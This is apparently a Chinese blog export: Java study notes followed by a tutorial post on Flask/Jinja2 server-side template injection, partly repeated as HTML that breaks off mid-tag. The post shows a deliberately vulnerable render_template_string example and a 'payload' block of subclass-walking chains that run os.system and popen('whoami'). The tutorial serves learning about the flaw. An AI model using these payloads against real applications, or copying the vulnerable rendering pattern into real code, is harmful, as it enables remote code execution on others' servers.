接口</h2><p>接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p>\n<p>接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。</p>\n<p>除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。</p>\n<p>接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。</p>\n<h3 id=\"接口与类相似点：\"><a href=\"#接口与类相似点：\" class=\"headerlink\" title=\"接口与类相似点：\"></a>接口与类相似点：</h3><ul>\n<li>一个接口可以有多个方法。</li>\n<li>接口文件保存在 .java 结尾的文件中，文件名使用接口名。</li>\n<li>接口的字节码文件保存在 .class 结尾的文件中。</li>\n<li>接口相应的字节码文件必须在与包名称相匹配的目录结构中。</li>\n</ul>\n<h3 id=\"接口与类的区别：\"><a href=\"#接口与类的区别：\" class=\"headerlink\" title=\"接口与类的区别：\"></a>接口与类的区别：</h3><ul>\n<li>接口不能用于实例化对象。</li>\n<li>接口没有构造方法。</li>\n<li>接口中所有的方法必须是抽象方法。</li>\n<li>接口不能包含成员变量，除了 static 和 final 变量。</li>\n<li>接口不是被类继承了，而是要被类实现。</li>\n<li>接口支持多继承。</li>\n</ul>\n<h3 id=\"接口特性\"><a href=\"#接口特性\" class=\"headerlink\" title=\"接口特性\"></a>接口特性</h3><ul>\n<li>接口和接口中每一个方法都是是隐式抽象的,接口中的方法会被隐式的指定为 <strong>public abstract</strong>（只能是 public abstract，其他修饰符都会报错）。</li>\n<li>接口中可以含有变量，但是接口中的变量会被隐式的指定为 <strong>public static final</strong> 变量（并且只能是 public，用 private 修饰会报编译错误）。</li>\n<li>接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。</li>\n</ul>\n<h3 id=\"抽象类和接口的区别\"><a href=\"#抽象类和接口的区别\" class=\"headerlink\" title=\"抽象类和接口的区别\"></a>抽象类和接口的区别</h3><ul>\n<li>1.抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。</li>\n<li>2.抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 <strong>public static final</strong> 类型的。</li>\n<li>3.接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。</li>\n<li>4.一个类只能继承一个抽象类，而一个类却可以实现多个接口。</li>\n</ul>\n<h3 id=\"标记接口\"><a href=\"#标记接口\" class=\"headerlink\" title=\"标记接口\"></a>标记接口</h3><p>最常用的继承接口是没有包含任何方法的接口。</p>\n<p><strong>标记接口是没有任何方法和属性的接口.它仅仅表明它的类属于一个特定的类型,供其他代码来测试允许做一些事情。</strong></p>\n<p>标记接口作用：简单形象的说就是给某个对象打个标（盖个戳），使对象拥有某个或某些特权。</p>\n<p>例如：java.awt.event 包中的 MouseListener 接口继承的 java.util.EventListener 接口定义如下：</p>\n<pre><code class=\"java\">package java.util;\npublic interface EventListener\n{}</code></pre>\n<p>没有任何方法的接口被称为标记接口。标记接口主要用于以下两种目的：</p>\n<ul>\n<li><p>建立一个公共的父接口：</p>\n<p>正如EventListener接口，这是由几十个其他接口扩展的Java API，你可以使用一个标记接口来建立一组接口的父接口。例如：当一个接口继承了EventListener接口，Java虚拟机(JVM)就知道该接口将要被用于一个事件的代理方案。</p>\n</li>\n<li><p>向一个类添加数据类型：</p>\n<p>这种情况是标记接口最初的目的，实现标记接口的类不需要定义任何接口方法(因为标记接口根本就没有方法)，但是该类通过多态性变成一个接口类型。</p>\n</li>\n</ul>\n<p><strong>通俗说法</strong>：</p>\n<p>以Serializable接口为例。一个类实现了这个接口，说明它可以被序列化。因此，我们实际上通过Serializable这个接口，给该类标记了“可被序列化”的元数据，打上了“可被序列化”的标签。这也是标记/标签接口名字的由来。</p>\n<p>一个类实现Serializable接口，使得我们可以用 <em>instanceof</em> 对类进行类型查询<em>,</em>例如：</p>\n<p>​    <em>if(obj instanceof Serializable) {………}</em></p>\n<h2 id=\"java包\"><a href=\"#java包\" class=\"headerlink\" title=\"java包\"></a>java包</h2><p>语法：</p>\n<pre><code class=\"java\">package ...    //定义一个包（表明接下来定义的这个类、接口、枚举或注释在该包中）\n例：\n    package net.java.util;    //说明这个类在net.java.util这个包里\n\nimport package1[.package2…].(classname);    //引入一个包或类，使接下来可以直接使用这个包中的类\n例：\n    import net.java.util.*;        //引入net.java.util包中的所有类\n    import net.java.util.Something;        //引入net.java.util包中的Something类</code></pre>\n<h3 id=\"package的目录结构\"><a href=\"#package的目录结构\" class=\"headerlink\" title=\"package的目录结构\"></a>package的目录结构</h3><p>类放在包中会有两种主要的结果：</p>\n<ul>\n<li>包名成为类名的一部分，正如我们前面讨论的一样。</li>\n<li>包名必须与相应的字节码所在的目录结构相吻合。</li>\n</ul>\n<p>例如上面的 net.java.util这个包，它里面的类的java文件的路径就是：</p>\n<p>\\sources\\net\\java\\util\\ *.java</p>\n<p>class文件的的路径就是：</p>\n<p>\\classes\\net\\java\\util\\ *.class</p>\n<h2 id=\"泛型\"><a href=\"#泛型\" class=\"headerlink\" title=\"泛型\"></a>泛型</h2><h3 id=\"泛型方法（C语言中的模板）\"><a href=\"#泛型方法（C语言中的模板）\" class=\"headerlink\" title=\"泛型方法（C语言中的模板）\"></a>泛型方法（C语言中的模板）</h3><p>你可以写一个泛型方法，该方法在调用时可以接收不同类型的参数。根据传递给泛型方法的参数类型，编译器适当地处理每一个方法调用。</p>\n<p>下面是定义泛型方法的规则：</p>\n<ul>\n<li>所有泛型方法声明都有一个类型参数声明部分（由尖括号分隔），<strong>该类型参数声明部分在方法返回类型之前</strong>（在下面例子中的<e>）。</e></li>\n<li>每一个类型参数声明部分包含一个或多个类型参数，参数间用逗号隔开。一个泛型参数，也被称为一个类型变量，是用于指定一个泛型类型名称的标识符。</li>\n<li>类型参数能被用来声明返回值类型，并且能作为泛型方法得到的实际参数类型的占位符。</li>\n<li>泛型方法体的声明和其他方法一样。注意<strong>类型参数只能代表引用型类型，不能是原始类型</strong>（像int,double,char的等）。</li>\n</ul>\n<p><strong>实例：</strong></p>\n<pre><code class=\"java\">public class GenericMethodTest\n{\n   // 泛型方法 printArray                         \n   public static &lt; E &gt; void printArray( E[] inputArray )\n   {\n      // 输出数组元素            \n         for ( E element : inputArray ){        \n            System.out.printf( &quot;%s &quot;, element );\n         }\n         System.out.println();\n    }\n\n    public static void main( String args[] )\n    {\n        // 创建不同类型数组： Integer, Double 和 Character\n        Integer[] intArray = { 1, 2, 3, 4, 5 };\n        Double[] doubleArray = { 1.1, 2.2, 3.3, 4.4 };\n        Character[] charArray = { &#39;H&#39;, &#39;E&#39;, &#39;L&#39;, &#39;L&#39;, &#39;O&#39; };\n\n        System.out.println( &quot;整型数组元素为:&quot; );\n        printArray( intArray  ); // 传递一个整型数组\n\n        System.out.println( &quot;\\n双精度型数组元素为:&quot; );\n        printArray( doubleArray ); // 传递一个双精度型数组\n\n        System.out.println( &quot;\\n字符型数组元素为:&quot; );\n        printArray( charArray ); // 传递一个字符型数组\n    } \n}</code></pre>\n<h2 id=\"Java-网络编程\"><a href=\"#Java-网络编程\" class=\"headerlink\" title=\"Java 网络编程\"></a>Java 网络编程</h2><h3 id=\"Socket-编程\"><a href=\"#Socket-编程\" class=\"headerlink\" title=\"Socket 编程\"></a>Socket 编程</h3><p>套接字使用TCP提供了两台计算机之间的通信机制。 客户端程序创建一个套接字，并尝试连接服务器的套接字。</p>\n<p>当连接建立时，服务器会创建一个 Socket 对象。客户端和服务器现在可以通过对 Socket 对象的写入和读取来进行通信。</p>\n<p>java.net.Socket 类代表一个套接字，并且 java.net.ServerSocket 类为服务器程序提供了一种来监听客户端，并与他们建立连接的机制。</p>\n<p>以下步骤在两台计算机之间使用套接字建立TCP连接时会出现：</p>\n<ul>\n<li><strong>服务器实例化一个 ServerSocket 对象，表示通过服务器上的端口通信。</strong></li>\n<li><strong>服务器调用 ServerSocket 类的 accept() 方法，该方法将一直等待，直到客户端连接到服务器上给定的端口。</strong></li>\n<li><strong>服务器正在等待时，一个客户端实例化一个 Socket 对象，指定服务器名称和端口号来请求连接。</strong></li>\n<li><strong>Socket 类的构造函数试图将客户端连接到指定的服务器和端口号。如果通信被建立，则在客户端创建一个 Socket 对象能够与服务器进行通信。</strong></li>\n<li><strong>在服务器端，accept() 方法返回服务器上一个新的 socket 引用，该 socket 连接到客户端的 socket。</strong></li>\n</ul>\n<p>连接建立后，通过使用 I/O 流在进行通信，每一个socket都有一个输出流和一个输入流，客户端的输出流连接到服务器端的输入流，而客户端的输入流连接到服务器端的输出流。</p>\n<p>TCP 是一个双向的通信协议，因此数据可以通过两个数据流在同一时间发送。</p>\n<h2 id=\"Java-多线程编程\"><a href=\"#Java-多线程编程\" class=\"headerlink\" title=\"Java 多线程编程\"></a>Java 多线程编程</h2><h3 id=\"线程的优先级\"><a href=\"#线程的优先级\" class=\"headerlink\" title=\"线程的优先级\"></a>线程的优先级</h3><p>每一个 Java 线程都有一个优先级，这样有助于操作系统确定线程的调度顺序。</p>\n<p>Java 线程的优先级是一个整数，其取值范围是 1 （Thread.MIN_PRIORITY ） - 10 （Thread.MAX_PRIORITY ）。</p>\n<p>默认情况下，每一个线程都会分配一个优先级 NORM_PRIORITY（5）。</p>\n<p>具有较高优先级的线程对程序更重要，并且应该在低优先级的线程之前分配处理器资源。但是，线程优先级不能保证线程执行的顺序，而且非常依赖于平台。</p>\n<p><strong>共有以下三种方法来创建多线程</strong></p>\n<h3 id=\"通过实现-Runnable-接口来创建线程\"><a href=\"#通过实现-Runnable-接口来创建线程\" class=\"headerlink\" title=\"通过实现 Runnable 接口来创建线程\"></a>通过实现 Runnable 接口来创建线程</h3><p>创建一个线程，最简单的方法是创建一个实现 Runnable 接口的类。</p>\n<p>为了实现 Runnable，一个类只需要执行一个方法调用 run()，声明如下：</p>\n<pre><code class=\"java\">public void run()</code></pre>\n<p>你可以重写该方法，重要的是理解的 run() 可以调用其他方法，使用其他类，并声明变量，就像主线程一样。</p>\n<p>在创建一个实现 Runnable 接口的类之后，你可以在类中实例化一个线程对象。</p>\n<p>Thread 定义了几个构造方法，下面的这个是我们经常使用的：</p>\n<pre><code class=\"java\">Thread(Runnable threadOb,String threadName);</code></pre>\n<p>这里，threadOb 是一个实现 Runnable 接口的类的实例，并且 threadName 指定新线程的名字。</p>\n<p>新线程创建之后，调用它的 start() 方法它才会运行。</p>\n<pre><code class=\"java\">void start();</code></pre>\n<h3 id=\"通过继承Thread来创建线程\"><a href=\"#通过继承Thread来创建线程\" class=\"headerlink\" title=\"通过继承Thread来创建线程\"></a>通过继承Thread来创建线程</h3><p>创建一个线程的第二种方法是创建一个新的类，该类继承 Thread 类，然后创建一个该类的实例。</p>\n<p>继承类必须重写 run() 方法，该方法是新线程的入口点。它也必须调用 start() 方法才能执行。</p>\n<p>该方法尽管被列为一种多线程实现方式，但是本质上也是实现了 Runnable 接口的一个实例。</p>\n<h3 id=\"通过-Callable-和-Future-创建线程\"><a href=\"#通过-Callable-和-Future-创建线程\" class=\"headerlink\" title=\"通过 Callable 和 Future 创建线程\"></a>通过 Callable 和 Future 创建线程</h3><ul>\n<li>1.创建 Callable 接口的实现类，并实现 call() 方法，该 call() 方法将作为线程执行体，并且有返回值。</li>\n<li>2.创建 Callable 实现类的实例，使用 FutureTask 类来包装 Callable 对象，该 FutureTask 对象封装了该 Callable 对象的 call() 方法的返回值。</li>\n<li>3.使用 FutureTask 对象作为 Thread 对象的 target 创建并启动新线程。</li>\n<li>4.调用 FutureTask 对象的 get() 方法来获得子线程执行结束后的返回值。</li>\n</ul>\n<h2 id=\"创建线程的三种方式的对比\"><a href=\"#创建线程的三种方式的对比\" class=\"headerlink\" title=\"创建线程的三种方式的对比\"></a>创建线程的三种方式的对比</h2><ul>\n<li><ol>\n<li>采用实现 Runnable、Callable 接口的方式创建多线程时，线程类只是实现了 Runnable 接口或 Callable 接口，还可以继承其他类。</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>使用继承 Thread 类的方式创建多线程时，编写简单，如果需要访问当前线程，则无需使用 Thread.currentThread() 方法，直接使用 this 即可获得当前线程。</li>\n</ol>\n</li>\n</ul>\n"},{"layout":"post","title":"2020-12-07-SSTI模板注入与Flask基础（略带沙箱逃逸）","date":"2020-12-06T16:00:00.000Z","description":"学习Flask模板注入了","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# SSTI模板注入与Flask基础\n\n### Flask简介\n\nFlask是一个Python上的**Web应用程序框架**（Web Application Framework）。\n\n**Web应用程序框架**是一个库和模块的集合，使Web应用程序开发人员能够编写Web应用程序，而不必担心协议，线程管理等低级细节。\n\n\n\nFlask基于**Werkzeug WSGI**工具包和**Jinja2**模板引擎。\n\n> ##### Werkzeug\n>\n> 它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。\n>\n> ##### jinja2\n>\n> jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。\n>\n> Flask通常被称为微框架。 它旨在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。相反，Flask支持扩展以向应用程序添加此类功能。\n\n**Jinjia模板引擎特点**\n\n![img](/img/jinja2语法.png)\n\n**控制语句**\n\n![image-20201222222445589](/img/image-20201222222445589.png)\n\n **注意：不可以使用`continue`和`break`表达式来控制循环的执行。**\n\n**过滤器**\n\n过滤器是通过（`|`）符号进行使用的，例如：`{{ name|length }}：`将返回name的长度。\n\n过滤器相当于是一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再将结果渲染到页面中。\n\n## SSTi漏洞的产生\n\nssti漏洞产生于网页模板中的变量被二次渲染时。\n\n什么是二次渲染，这里用两个例子简单展示：\n\n无二次渲染：\n\n```python\nfrom flask import *\n\napp=Flask(__name__)\n@app.route('/')\ndef index():\n    str=request.args.get('s')\n    html='<h1>Welcome</h1></br><p>{{str}}</p>'\n    return render_template_string(html,str=str)\nif __name__=='__main__':\n    app.run()\n```\n\n有二次渲染行为：\n\n```python\nfrom flask import *\n\napp=Flask(__name__)\n@app.route('/')\ndef index():\n    str=request.args.get('s')\n    html=\"<h1>Welcome</h1></br><p>%s</p>\"%(str)\n    return render_template_string(html)\nif __name__==\"__main__\":\n    app.run()\n```\n\n如果在页面中找到了这样一个ssti漏洞，便意味着我们能够在这个注入点执行该模板引擎的控制语句以及命令\n\nFlask SSTI 题的基本思路就是利用 python 中的 **魔术方法** 找到自己要用的函数。\n\n```\n__dict__：保存类实例或对象实例的属性变量键值对字典\n\n__class__：返回调用的参数类型\n\n__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 \n\n__base__: 返回该对象所继承的基类\n\n__bases__：返回该对象所继承的类型列表\n\n__subclasses__：以一个列表的形式返回对象的子类\n\n__init__：类的初始化方法\n\n__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价\n```\n\n基本步骤：\n\n使用魔术方法进行函数解析，再获取基本类：\n\n```python\n''.__class__.__mro__[2]\n{}.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[8] //针对jinjia2/flask为[9]适用\n```\n\n获取基本类后，继续向下获取基本类 object 的子类：\n\n```python\nobject.__subclasses__()\n```\n\n这里有可能子类中就含有可以利用的函数，如file,eval等，但是一般是没有的\n\n可以用以下模板控制语句找找看\n\n![image-20201222222642704](/img/image-20201222222642704.png)\n\n找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：\n\n```python\n>>> ''.__class__.__mro__[2].__subclasses__()[99].__init__\n<slot wrapper '__init__' of 'object' objects>\n>>> ''.__class__.__mro__[2].__subclasses__()[59].__init__\n<unbound method WarningMessage.__init__>\n```\n\n或者用模板控制语句找到可以利用的模块，或者__builtins__\n\n![image-20201222222733823](/img/image-20201222222733823.png)\n\n\n\n构造payload\n\n```\n''.__class__.__base__.__subclasses__()[59]\n\n''.__class__.__base__.__subclasses__()[81].__init__.__globals__['__builtins__']\n\n''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')\n\n''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')\n\n''.__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"whoami\").read()')\n```\n\n","source":"_posts/2020-12-07-SSTI模板注入与Flask基础.md","raw":"---\nlayout: post\ntitle: 2020-12-07-SSTI模板注入与Flask基础（略带沙箱逃逸）\ndate: 2020-12-07\ncategories: blog\ntags: [web,php]\ndescription: 学习Flask模板注入了\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# SSTI模板注入与Flask基础\n\n### Flask简介\n\nFlask是一个Python上的**Web应用程序框架**（Web Application Framework）。\n\n**Web应用程序框架**是一个库和模块的集合，使Web应用程序开发人员能够编写Web应用程序，而不必担心协议，线程管理等低级细节。\n\n\n\nFlask基于**Werkzeug WSGI**工具包和**Jinja2**模板引擎。\n\n> ##### Werkzeug\n>\n> 它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。\n>\n> ##### jinja2\n>\n> jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。\n>\n> Flask通常被称为微框架。 它旨在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。相反，Flask支持扩展以向应用程序添加此类功能。\n\n**Jinjia模板引擎特点**\n\n![img](/img/jinja2语法.png)\n\n**控制语句**\n\n![image-20201222222445589](/img/image-20201222222445589.png)\n\n **注意：不可以使用`continue`和`break`表达式来控制循环的执行。**\n\n**过滤器**\n\n过滤器是通过（`|`）符号进行使用的，例如：`{{ name|length }}：`将返回name的长度。\n\n过滤器相当于是一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再将结果渲染到页面中。\n\n## SSTi漏洞的产生\n\nssti漏洞产生于网页模板中的变量被二次渲染时。\n\n什么是二次渲染，这里用两个例子简单展示：\n\n无二次渲染：\n\n```python\nfrom flask import *\n\napp=Flask(__name__)\n@app.route('/')\ndef index():\n    str=request.args.get('s')\n    html='<h1>Welcome</h1></br><p>{{str}}</p>'\n    return render_template_string(html,str=str)\nif __name__=='__main__':\n    app.run()\n```\n\n有二次渲染行为：\n\n```python\nfrom flask import *\n\napp=Flask(__name__)\n@app.route('/')\ndef index():\n    str=request.args.get('s')\n    html=\"<h1>Welcome</h1></br><p>%s</p>\"%(str)\n    return render_template_string(html)\nif __name__==\"__main__\":\n    app.run()\n```\n\n如果在页面中找到了这样一个ssti漏洞，便意味着我们能够在这个注入点执行该模板引擎的控制语句以及命令\n\nFlask SSTI 题的基本思路就是利用 python 中的 **魔术方法** 找到自己要用的函数。\n\n```\n__dict__：保存类实例或对象实例的属性变量键值对字典\n\n__class__：返回调用的参数类型\n\n__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 \n\n__base__: 返回该对象所继承的基类\n\n__bases__：返回该对象所继承的类型列表\n\n__subclasses__：以一个列表的形式返回对象的子类\n\n__init__：类的初始化方法\n\n__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价\n```\n\n基本步骤：\n\n使用魔术方法进行函数解析，再获取基本类：\n\n```python\n''.__class__.__mro__[2]\n{}.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[8] //针对jinjia2/flask为[9]适用\n```\n\n获取基本类后，继续向下获取基本类 object 的子类：\n\n```python\nobject.__subclasses__()\n```\n\n这里有可能子类中就含有可以利用的函数，如file,eval等，但是一般是没有的\n\n可以用以下模板控制语句找找看\n\n![image-20201222222642704](/img/image-20201222222642704.png)\n\n找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：\n\n```python\n>>> ''.__class__.__mro__[2].__subclasses__()[99].__init__\n<slot wrapper '__init__' of 'object' objects>\n>>> ''.__class__.__mro__[2].__subclasses__()[59].__init__\n<unbound method WarningMessage.__init__>\n```\n\n或者用模板控制语句找到可以利用的模块，或者__builtins__\n\n![image-20201222222733823](/img/image-20201222222733823.png)\n\n\n\n构造payload\n\n```\n''.__class__.__base__.__subclasses__()[59]\n\n''.__class__.__base__.__subclasses__()[81].__init__.__globals__['__builtins__']\n\n''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')\n\n''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')\n\n''.__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"whoami\").read()')\n```\n\n","slug":"2020-12-07-SSTI模板注入与Flask基础","published":1,"updated":"2020-12-22T14:40:37.029Z","comments":1,"photos":[],"link":"","_id":"ckkntx9kb0021xov7thxhgm1k","content":"<h1 id=\"SSTI模板注入与Flask基础\"><a href=\"#SSTI模板注入与Flask基础\" class=\"headerlink\" title=\"SSTI模板注入与Flask基础\"></a>SSTI模板注入与Flask基础</h1><h3 id=\"Flask简介\"><a href=\"#Flask简介\" class=\"headerlink\" title=\"Flask简介\"></a>Flask简介</h3><p>Flask是一个Python上的<strong>Web应用程序框架</strong>（Web Application Framework）。</p>\n<p><strong>Web应用程序框架</strong>是一个库和模块的集合，使Web应用程序开发人员能够编写Web应用程序，而不必担心协议，线程管理等低级细节。</p>\n<p>Flask基于<strong>Werkzeug WSGI</strong>工具包和<strong>Jinja2</strong>模板引擎。</p>\n<blockquote>\n<h5 id=\"Werkzeug\"><a href=\"#Werkzeug\" class=\"headerlink\" title=\"Werkzeug\"></a>Werkzeug</h5><p>它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。</p>\n<h5 id=\"jinja2\"><a href=\"#jinja2\" class=\"headerlink\" title=\"jinja2\"></a>jinja2</h5><p>jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p>\n<p>Flask通常被称为微框架。 它旨在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。相反，Flask支持扩展以向应用程序添加此类功能。</p>\n</blockquote>\n<p><strong>Jinjia模板引擎特点</strong></p>\n<p><img src=\"/img/jinja2%E8%AF%AD%E6%B3%95.png\" alt=\"img\"></p>\n<p><strong>控制语句</strong></p>\n<p><img src=\"/img/image-20201222222445589.png\" alt=\"image-20201222222445589\"></p>\n<p> <strong>注意：不可以使用<code>continue</code>和<code>break</code>表达式来控制循环的执行。</strong></p>\n<p><strong>过滤器</strong></p>\n<p>过滤器是通过（<code>|</code>）符号进行使用的，例如：<code>0：</code>将返回name的长度。</p>\n<p>过滤器相当于是一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再将结果渲染到页面中。</p>\n<h2 id=\"SSTi漏洞的产生\"><a href=\"#SSTi漏洞的产生\" class=\"headerlink\" title=\"SSTi漏洞的产生\"></a>SSTi漏洞的产生</h2><p>ssti漏洞产生于网页模板中的变量被二次渲染时。</p>\n<p>什么是二次渲染，这里用两个例子简单展示：</p>\n<p>无二次渲染：</p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\napp<span class=\"token operator\">=</span>Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\n@app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    str<span class=\"token operator\">=</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">)</span>\n    html<span class=\"token operator\">=</span><span class=\"token string\">'&lt;h1>Welcome&lt;/h1>&lt;/br>&lt;p>{{str}}&lt;/p>'</span>\n    <span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>html<span class=\"token punctuation\">,</span>str<span class=\"token operator\">=</span>str<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>有二次渲染行为：</p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\napp<span class=\"token operator\">=</span>Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\n@app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    str<span class=\"token operator\">=</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">)</span>\n    html<span class=\"token operator\">=</span><span class=\"token string\">\"&lt;h1>Welcome&lt;/h1>&lt;/br>&lt;p>%s&lt;/p>\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>html<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>如果在页面中找到了这样一个ssti漏洞，便意味着我们能够在这个注入点执行该模板引擎的控制语句以及命令</p>\n<p>Flask SSTI 题的基本思路就是利用 python 中的 <strong>魔术方法</strong> 找到自己要用的函数。</p>\n<pre><code>__dict__：保存类实例或对象实例的属性变量键值对字典\n\n__class__：返回调用的参数类型\n\n__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 \n\n__base__: 返回该对象所继承的基类\n\n__bases__：返回该对象所继承的类型列表\n\n__subclasses__：以一个列表的形式返回对象的子类\n\n__init__：类的初始化方法\n\n__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</code></pre><p>基本步骤：</p>\n<p>使用魔术方法进行函数解析，再获取基本类：</p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\"><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__bases__<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__bases__<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__bases__<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\nrequest<span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">//</span>针对jinjia2<span class=\"token operator\">/</span>flask为<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>适用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>获取基本类后，继续向下获取基本类 object 的子类：</p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\">object<span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这里有可能子类中就含有可以利用的函数，如file,eval等，但是一般是没有的</p>\n<p>可以用以下模板控制语句找找看</p>\n<p><img src=\"/img/image-20201222222642704.png\" alt=\"image-20201222222642704\"></p>\n<p>找到重载过的<strong>init</strong>类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：</p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\"><span class=\"token operator\">>></span><span class=\"token 